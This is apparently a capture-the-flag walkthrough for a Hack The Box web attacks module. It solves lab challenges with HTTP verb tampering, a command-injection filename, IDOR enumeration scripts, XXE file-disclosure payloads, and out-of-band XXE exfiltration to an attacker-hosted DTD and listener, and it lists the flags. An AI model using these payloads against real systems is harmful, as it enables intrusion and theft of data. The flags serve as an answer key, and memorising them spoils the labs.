# HTB-Web_Attacks

## Table of Contents
0. [Tools/Useful Links](#toolsuseful-links)
1. [HTTP Verb Tampering](#http-verb-tampering)
    1. [Bypassing Basic Authentication](#bypassing-basic-authentication)
    2. [Bypassing Security Filters](#bypassing-security-filters)
2. [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
    1. [Mass IDOR Enumeration](#mass-idor-enumeration)
    2. [Bypassing Encoded References](#bypassing-encoded-references)
    3. [IDOR in Insecure APIs](#idor-in-insecure-apis)
    4. [Chaining IDOR Vulnerabilities](#chaining-idor-vulnerabilities)
3. [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
    1. [Local File Disclosure](#local-file-disclosure)
    2. [Advanced File Disclosure](#advanced-file-disclosure)
    3. [Blind Data Exfiltration](#blind-data-exfiltration)

## Tools/Useful Links
1. Burpsuite
2. [XXEinjector](https://github.com/enjoiz/XXEinjector)

## HTTP Verb Tampering
### Bypassing Basic Authentication
#### Challenges
1. Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.

    We can solve this by changing the request header from **GET** to **PUT**. The answer is `HTB{4lw4y5_c0v3r_4ll_v3rb5}`.

### Bypassing Security Filters
#### Challenges
1. To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./

    To solve this, we need to change the endpoint to `/index.php` and use **POST** as the HTTP Verb. We can click **change request method** to **POST**. Here the request looks like:

    ![alt text](<Assets/Bypassing Security Filters - 1.png>)

    The answer is `HTB{b3_v3rb_c0n51573n7}`.

## Insecure Direct Object References (IDOR)
### Mass IDOR Enumeration
#### Challenges
1. Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.

    We will see this when we inspect the website:

    ![alt text](<Assets/Mass IDOR Enumeration - 1.png>)

    This means that documents.php expects uid via POST. We can make script to automate download the file.

    ```bash
    #!/bin/bash

    url="http://94.237.120.74:55080"

    for i in {1..20}; do
        echo "[*] UID=$i"
        curl -s -X POST -d "uid=$i" "$url/documents.php" \
        | grep -oP "/documents/[^'\"]+\.(pdf|txt)" \
        | while read -r file; do
            echo "    [+] Downloading $file"
            wget -nc "$url$file"
        done
    done
    ```
    The answer is `HTB{4ll_f1l35_4r3_m1n3}`.

### Bypassing Encoded References
#### Challenges
1. Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.

    When we inspect the **/contract.php** endpoint we will get the logic of how the contract value is generated.

    ![alt text](<Assets/Bypassing Encoded References - 1.png>)

    Based on that, the contract value is generated by taking the uid and encoding it with base64. We can make script to automate download the file.

    ```bash
    #!/bin/bash

    url="http://94.237.120.74:39625"

    for i in {1..20}; do
        contract=$(echo -n "$i" | base64 -w 0)
        echo "[*] UID=$i â†’ contract=$contract"
        wget -nc "$url/download.php?contract=$contract"
    done
    ```

    Then, we can use this script to find the flag:

    ```bash
    #!/bin/bash

    for f in download.php\?contract=*; do
        strings "$f" | grep -iE "HTB\{|flag"
    done
    ```
    The answer is `HTB{h45h1n6_1d5_w0n7_570p_m3}`.

### IDOR in Insecure APIs
#### Challenges
1. Try to read the details of the user with 'uid=5'. What is their 'uuid' value?

    After doing some exploration, we can solve this by intercepting the request of **/profile/index.php** endpoint with Burp Suite. We can change the header to **GET** by clicking **change request method** to **GET**. Then, we need to change the endpoint from **/profile/api.php/profile/1** to **/profile/api.php/profile/5**. It will look like this:

    ![alt text](<Assets/IDOR in Insecure APIs - 1.png>)

    The answer is `eb4fe264c10eb7a528b047aa983a4829`.

### Chaining IDOR Vulnerabilities
#### Challenges
1. Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.

    We can solve this with several steps:
    1. Find valid admin role via IDOR in Insecure APIs (Brute Force the uid to find the admin role).
        
        We can use this script from seclists:

        ```txt
        /usr/share/seclists/Fuzzing/3-digits-000-999.txt
        ```
        We need to intercept the request of **/profile/index.php** endpoint with Burp Suite. After that, change the header to **GET** by clicking **change request method** to **GET**. Then send it to intruder to find the valid admin role.

        ![alt text](<Assets/Chaining IDOR Vulnerabilities - 1.png>)

        We can see that the valid admin role is **staff_admin**.

    2. Update the admin's email to 'flag@idor.htb'.

        In the step 1, we have found the valid admin role with the information of its account. We can use it to update the admin's email to 'flag@idor.htb'.

        ![alt text](<Assets/Chaining IDOR Vulnerabilities - 2.png>)

    3. Refresh **/profile/index.php** to get the flag.

        We can see the flag in the page. The answer is `HTB{1_4m_4n_1d0r_m4573r}`.

    
## XML External Entity (XXE) Injection
### Local File Disclosure
#### Challenges
1. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.

    We can solve this by using XXE Injection. We can use the following payload:

    ```xml
    <!DOCTYPE email [
    <!ENTITY exploit SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
    ]>
    ```
    This payload will read the content of the 'connection.php' file and encode it with base64. We also need to add **exploit** entity to the displayed field.

    ![alt text](<Assets/Local File Disclosure - 1.png>)

    The answer is `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`.

### Advanced File Disclosure
#### Challenges
1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

    In this challenge, i have solved it with CDATA method. First, we need to modify the XML request with the following content:

    ```xml
    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///flag.php">
    <!ENTITY % end "]]>"> 
    <!ENTITY % xxe SYSTEM "http://10.10.14.101:8000/xxe.dtd"> 
    %xxe;
    ]>
    ...
    <email>&joined;</email>
    ...
    ```
    We need to create an external DTD file named xxe.dtd. This file is necessary because XML rules forbid combining the CDATA tags and the file content directly in the main request.

    ```xml
    <!ENTITY joined "%begin;%file;%end;">
    ```
    Aftter that, we need to host xxe.dtd file on our local machine. We can use python  to host it.

    ```bash
    python3 -m http.server 8000
    ```
    ![alt text](<Assets/Advanced File Disclosure - 1.png>)
    
    The answer is `HTB{3rr0r5_c4n_l34k_d474}`.

### Blind Data Exfiltration
#### Challenges
1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

    We can solve this with OOB Exfiltration method. In here, i solved it with XXEinjector tool. By using this tool, we need to get the request of **/blind** endpoint with Burp Suite. We dont need to include the full XML data. We only need the first line of XML data following with **XXEINJECT** on it. It will look like this:

    ```txt
    POST /blind/submitDetails.php HTTP/1.1
    Host: 10.129.234.170
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://10.129.234.170/blind/
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 139
    Origin: http://10.129.234.170
    DNT: 1
    Connection: keep-alive
    Priority: u=0

    <?xml version="1.0" encoding="UTF-8"?>
    XXEINJECT
    ```
    Once we save the request, we can use XXEinjector tool.

    ```bash
    xxeinjector --host=10.10.14.101 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
    ```
    We can find the result in the Log folder. The answer is `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`.
